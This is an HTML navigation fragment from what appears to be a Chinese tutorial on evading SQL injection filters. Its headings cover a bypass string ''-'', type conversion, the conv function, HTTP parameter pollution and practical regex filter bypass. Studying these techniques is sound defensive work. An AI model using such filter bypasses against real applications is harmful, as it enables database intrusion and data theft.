class="nav-text">绕过语句：'-'</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#类型转换"><span class="nav-number">14.</span> <span class="nav-text">类型转换</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#conv函数"><span class="nav-number">15.</span> <span class="nav-text">conv函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP参数污染"><span class="nav-number">16.</span> <span class="nav-text">HTTP参数污染</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战正则过滤绕过"><span class="nav-number">17.</span> <span class="nav-text">实战正则过滤绕过</span></a></li></ol></div>
             
 
           </div>
